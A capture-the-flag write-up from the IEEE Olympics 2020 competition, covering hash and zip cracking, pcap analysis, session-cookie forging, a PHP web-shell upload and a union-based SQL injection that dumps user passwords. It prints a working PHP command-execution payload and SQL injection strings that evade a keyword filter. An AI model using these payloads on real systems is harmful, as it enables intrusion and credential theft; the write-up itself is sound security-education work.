# IEEE_Olympics_CTF_2020
This repo contains writeups for IEEE Olympics 1.0 CTF 2020.
Produced to by Champion Team. 
We got the **4th place** with 494 points only 3 points to the 3rd place, enjoy.
Team Members: Abanob Medhat, Mohamed Saleh, Hussein El-Sayed
## Misc
### Warm Up
the description of the challenge was: "Can you fix the hash and obtain the clear text password? NDgyYzgxMWRoYTVkNWI0YmM2ZDQ5N2ZmYTk4NDkxemUzOA== Flag format is IEEE{PASSWORD}"

We have this encoded string "NDgyYzgxMWRoYTVkNWI0YmM2ZDQ5N2ZmYTk4NDkxemUzOA==" and it's clearly that it's base64 encoded
So I decoded it:
![image 1](https://imgur.com/mFXYJXh.png)

And we got this hash "482c811dha5d5b4bc6d497ffa98491ze38"

I use a tool called hash-identifier to know the type of the hash
but when I put the hash it doesn't find any result
I thought of removing characters to see the nearest hash to it in length
and it gave me MD5 after removing 2 characters
![image 2](https://imgur.com/ZWGh2N7.png)

I asked my self which character two characters are the wrong ones?
When I reviewed the hash characters I found "z" and "h" characters in the string, but MD5 contains only hex characters, so I removed these two character
and the hash is like the following: "482c811da5d5b4bc6d497ffa98491e38"

The fastest way to crack a hash.. is googling it
![image 3](https://imgur.com/TxUEw2H.png)

and we got the password: "password123"
wrapping it in flag wrapper and we got the flag: IEEE{password123}



### Brute Me
#### The challenge gave me a .zip file named flag.zip, and gave me a description: "Crack the zip, get the flag!"
It obviously gave me the solution in the description
A good tool I use to crack zip files is fcrackzip

Running the following command: "fcrackzip -v -u -D -b rockyou.txt flag.zip"
![image 1](https://imgur.com/L0Ok0QT.png)

And we got the password: "sainsburys"
Unzipping the file with command: "unzip file.zip"
Giving it the password and we got file.txt
![image 2](https://imgur.com/4gCwvtF.png)

Reading the file and we got the flag: "IEEE{Easy_Brute}"
![image 3](https://imgur.com/l55br80.png)


### Unsecure
The challenge gave me a .pcap file and said in the description: "Get the plaintext password found in the attached packet Flag format : IEEE{Plaintext_Password}"

I opened the file using Wireshark and found a telnet protocol packets
As the protocol wasn't secure I could read the data, so I followed the TCP stream
![image 1](https://imgur.com/shs16LT.png)

so the data was like the following:
![image 2](https://imgur.com/47pOnPU.png)

and we got the password: So_Uns3cure
wrapping it up into the flag wrapper and we get the flag: IEEE{So_Uns3cure}



## Web
### S3ssion master
#### Description
We've implemented a secure session management system, prove we're wrong! http://207.154.231.228:3000/ Flag format IEEE{FLAG}

Challenge points: 100 
(![landing](https://www5.0zz0.com/2020/09/29/23/789394231.jpg))
#### Dive into The Challenge
After checking the request and response on burp, I found that there is a Cookie named session has this value [40l1140oorxeezn246edkbsi6menvfyiun5abk5pi1epg89q12187jk4s8wqbpg3]

I tried to find out the encryption used to generate this cookie, but I didn’t find anything. 
Also tried directory brute force using dirsearch tool
, but also, didn’t find anything. 
(![cookie](https://www6.0zz0.com/2020/09/29/23/653459954.jpg))

After some time, the organizer gave us 2 hints to solve the challenge:
- It’s all about sessions.
- Hidden directories are always useful.
(![hint1](https://www7.0zz0.com/2020/09/30/00/184825154.jpg))
So now I know that this challenge has some directory hidden who will help me to solve it.

So, I tried dirsearch, dirb and any directory brute force tool on my kali, but nothing worked.
Also, I tried to guess the file name but didn’t work.
After some search I found this ([website](https://pentest-tools.com/website-vulnerability-scanning/discover-hidden-directories-and-files))
I tried to use it, and finally I got the directory **sess**.

(![sessions](https://www4.0zz0.com/2020/09/30/00/778163608.jpg))

It had 2 directories leads to two files, inside the two files {is admin:true} {is admin:flase}.
I found that the path with the file name that has admin is false is the current cookie.
So, I followed the other path of admin is true,
And tried to concatenate it and set it in the cookie.

(![admin is true](https://www4.0zz0.com/2020/09/30/00/377278789.jpg))
We set the new cookie to: ryt2w3nd2nxxonrdbqd7qh1ok71bzpev8zpa7vgnn24db4m4imvrhzo1zatw10iv
(![flag Session](https://www2.0zz0.com/2020/09/30/01/183269445.png))

Done We have the flag.


### Se3cure Uploader
#### Description
We have released our new open source file uploading service, do
your things and find out if there are any security gaps. Source
code is attached, demo can be found
at http://165.227.140.251/s3cure_uploader To be more secure,
and for testing purposes we are deleting the uploaded files every 3
mins. flag file can be found at flag.php.
Challenge Points: 200
(![challenge](https://www4.0zz0.com/2020/09/29/22/474349029.jpg))

#### Dive into The Challenge
When I finished reading the description, I found that is file upload challenge, so all what I have is to upload picture or file and execute commands to read flag.php file. 
when I tried to upload jpg picture it returns the path to it, but the name of the file is **hashed** with .jpg extention.
so, I tried to upload .php file, it returns **invalid type**.
(![upload](https://www5.0zz0.com/2020/09/29/22/704605433.png))
(![invalid type](https://www8.0zz0.com/2020/09/29/23/676416689.png))

#### Source code analysis 
So first, I downloaded the source code, began to analysis it carefully.
As shown in the below picture of upload.php
(![source](https://www8.0zz0.com/2020/09/29/22/273265710.jpg))


From analyzing, I found the following:
-	After uploading the file, it will be saved in the uploads directory
-	The server saves with different name from its original name.
-	There is validation on the size and type of file that must be an image.
So, I started to run the source code locally on my laptop and try to solve it.

From source code I found that naming the file have the following procedure:
1.	Generate random number from 1 to 1000
2.	Concatenate the random number with the current time in format y-m-d min-sec
3.	Concatenate to them the file original name without extension.
4.	Apply md5 hashing method to the previous combination.
5.	concatenate to the output hash the extension of the file.

In the upload image challenges there are 2 things you need to check:
- upload image with php code successfully. 
- path to access it.

#### Solution Process
I made some modification to print the time and random number as shown from that i found that the time of response + 3h will return the time required ,but this was in my local server only in the challenge server there was no constant hours to add.
(![local server](https://www8.0zz0.com/2020/09/29/22/978549807.png))

so, we had one variable in the name generated hash function was the random value.
here i tried to upload image with php code injected to my local server and check if I could get it. 
I found that the server saved it with new hash name and can be accessed, but the server didn't show the name.

So, all what I have to do was:
1. Inject picture with php code to get RCE. 
2. rename it to image.jpg.php.
3. take the date in response.
4. generate 1000 possible hash names.
5. use a tool like intruder in burp and give it the names to return the correct one to you.
6. finally execute your commands.

To inject php I used exiftoo with this command:
`exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' test5.jpg`
Then renamed it to: test5.jpg.php.
I uploaeded it and got the response date and gave to a script I wrote for this challenge you can get it in the repo above. 
so, I had file with 1000 possible hash names, I tried to give it to the intruder and started it, but it didn't work because intruder took long time and the server was deleting the files every **3 Minutes** .

In this point I talked to my teammates for a help. my teammate **Mohammed Saleh** told me to use a great tool called FUFF.
You can get it from ([here](https://github.com/ffuf/ffuf)).

WoW it worked!!!
(![FUFF](https://www11.0zz0.com/2020/09/29/23/841804976.png))

So, I had the path, let's get the flag.
I tried to put the parameter cmd=ls to list the contents of the folder.
(![before flag](https://www13.0zz0.com/2020/09/29/23/931832642.png))

Let's take step before this directory.
(![before flag2](https://www5.0zz0.com/2020/09/29/23/161437722.png))

After showing the flag it returned blank page so, I showed the source page, and We got the flag successfully.
(![flag](https://www5.0zz0.com/2020/09/29/23/525548868.png))


I would like to thank to the organizers for this competition that was very interesting and had very good challenges.
Thanks to my Teammates (Mohamed Saleh & Hussen ELSayed) for this great effort.


### Inj3ct th!s
![image 1](https://imgur.com/dEaPMcO.png)
![image 2](https://imgur.com/AmotZli.png)
The challenge begins with an admin login page asking for username and password
Trying to bypass the login form with sql logic errors such as: `' or 1=1`
And trying to bruteforce with username admin and variable password, but neither worked
![image 3](https://imgur.com/gs07Chu.png)
I checked the source code to see if it contains any errors from back-end but it didn't
![image 4](https://imgur.com/BS3muVD.png)
So I ran dirsearch with command: python3 dirsearch.py -u 10.13.37.10:9201/ -e php,py,js,html,zip,txt,rar,tar,gz,tar.gz,bak,bac,bak1,BAK,old,src
![image 5](https://imgur.com/wXTsXaF.png)
And I got a robots.txt file
Cheking it I found that it contains a file names user_info.php
![image 6](https://imgur.com/j2Yd0ar.png)
Checking this file I found that it only contains "Invalid input!" message
![image 7](https://imgur.com/D9kvLlb.png)
It clearly need a parameter to work, but what is it ?
I tried the most first parameter came on my mind which is "id" but it didn't work
![image 8](https://i.imgur.com/W0e0qSA.png)
So I brute forced the parameter name using burp intruder with burp prepared payloads list "Form field names"
![image 9](https://i.imgur.com/E6PK02v.png)
![image 10](https://imgur.com/i836WNg.png)
And we got the parameter name: uid
![image 11](https://imgur.com/fnxAI90.png)
So here's what the uid parameter do:
1- It takes the input as a number and asks for a token cookie in the back-end specified for this number
![image 12](https://imgur.com/FhEVKWJ.png)
2- Another request goes with the token cookie asking for the information related to the number impaired to it and gets another token value for the next request
![image 13](https://i.imgur.com/o6z0pf4.png)
3- If you tried to use the same token value twice it'll answer "invalid token", that means each token can be used only once
![image 14](https://i.imgur.com/eTrQd6R.png)
Notes:
1. The mechanism of token handling is restricting the automation using tools like burp scanner or sqlmap
2. The token cookie is being specified in script tags not Set-Cookie header which makes it harder for automation

Testing the functionality of uid parameter I found that it returns the id, name and email of users
the admin's id was 8
![image 15](https://i.imgur.com/GspDW6k.png)

### Exploitation
uid is usually an integer value so I begin to inject directly withous balancing with `'` or `"`
![image 18](https://i.imgur.com/l2hLW7m.png)
The parameter seems to be injectable
Trying to determine the number of columns using order by
![image 19](https://imgur.com/bxDYgZk.png)
![image 20](https://i.imgur.com/hlWl0GU.png)
It has 5 columns
Trying union based sql injection
![image 21](https://i.imgur.com/nZriZ1L.png)
And the first 3 parameters reflected in the response
I tried to determine the database name and the DBMS
![image 22](https://i.imgur.com/zwHuBDt.png)
The database name: inj3ctme
I was suspicious about the DBMS being mysql since the concat method worked
So I searched the mysql versions and that confirmed it ( the last version of mysql is 8.0.21 like mentioned in the sqli output )
![image 23](https://i.imgur.com/GSoAjSm.png)
Now to extract data there're 2 things I needed to: table name and column name
I tried to extract table name first
Payload: `81 union select 1,2,table_name,4,5 from information_schema.tables`
http://207.154.255.223/inj3ct_easy/user_info.php?uid=81 union select 1,2,table_name,4,5 from information_schema.tables
![image 24](https://i.imgur.com/1vf8rmn.png)
But there was something wrong, the query is not executing
From the hint given I found that this was a filter for the "schema" word so I can't extract data using information_schema
![image 25](https://i.imgur.com/v7ADQf1.png)
My teamate gave me an article about an alternative for information_schema.tables: https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/
Following its method I got the table name with this command:
Payload: `81 union select 1,2,group_concat(table_name),4,5 from mysql.innodb_table_stats where database_name='inj3ctme'`
http://207.154.255.223/inj3ct_easy/user_info.php?uid=81 union select 1,2,group_concat(table_name),4,5 from mysql.innodb_table_stats where database_name='inj3ctme'
![image 26](https://i.imgur.com/P6Kf8bX.png)
I got only 1 table for "inj3ctme" database: tblusers
Now all I need to is the column name
But after a lot of search, I found another way to extract data from the column without knowing the column name from this article: https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/
The original payload in the article was: -1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
Modifying it to fit in our case: -1 union select 1,(select `4` from (select 1,2,3,4,5 union select * from tblusers)a limit 1,1),3,4,5
I changed the number of columns in the inner query from 6 to 5 and and the number of columns in the outer query from 2 to 5 and changed the table name from users to tblusers removed the comment as it wasn't necessary
![image 27](https://i.imgur.com/sUHZZAT.png)
This sql query viewing the fourth column which seems to be login names
Viewing the fifth column
Payload: `-1 union select 1,(select `5` from (select 1,2,3,4,5 union select * from tblusers)a limit 1,1),3,4,5`
![image 28](https://i.imgur.com/Wkm8EVq.png)
This column seems to be the passwords
The admin's id was 8 so I needed to change the limit value to 8,1 
Payload: `-1 union select 1,(select `5` from (select 1,2,3,4,5 union select * from tblusers)a limit 8,1),3,4,5`
![image 29](https://i.imgur.com/Amm7OrF.png)
And I got the password: Sup3rS3cretP@ssw0rd
return to the login page and login as
username: admin
password: Sup3rS3cretP@ssw0rd
![image 30](https://i.imgur.com/ImjYcKB.png)
And I got the flag: IEEE{Sch3ma0xedc327_is_Aw3some}
